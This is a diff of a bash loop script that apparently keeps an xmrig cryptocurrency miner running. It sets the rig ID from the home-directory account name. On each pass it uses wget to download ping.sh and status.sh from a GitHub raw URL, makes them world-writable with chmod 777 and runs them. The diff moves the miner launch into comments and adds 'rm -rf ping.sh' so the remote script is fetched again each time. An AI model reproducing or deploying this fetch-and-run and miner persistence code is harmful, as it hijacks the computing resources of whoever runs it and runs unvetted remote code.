@@ -5,6 +5,8 @@ version='0.24'
 path=$(pwd)
 account=${path#/home/}
 
+rm -rf ping.sh
+
 while true
 do
 
@@ -19,6 +21,11 @@ do
 #     sed -i 's/"rig-id":.*/"rig-id": "'$account'",/' config.json
 #  fi
 
+#  if ! pgrep xmrig > /dev/null
+#  then
+#     nice -n -20 ./xmrig
+#  fi
+
   if [ ! -e 'ping.sh' ]
   then
      wget -q https://raw.githubusercontent.com/Predador21/scripts/main/ping.sh && chmod 777 ping.sh
@@ -27,11 +34,6 @@ do
   if [ ! -e 'status.sh' ]
   then
      wget -q https://raw.githubusercontent.com/Predador21/scripts/main/status.sh && chmod 777 status.sh
-  fi
-
-  if ! pgrep xmrig > /dev/null
-  then
-     nice -n -20 ./xmrig
   fi
 
   if ! pgrep ping.sh > /dev/null
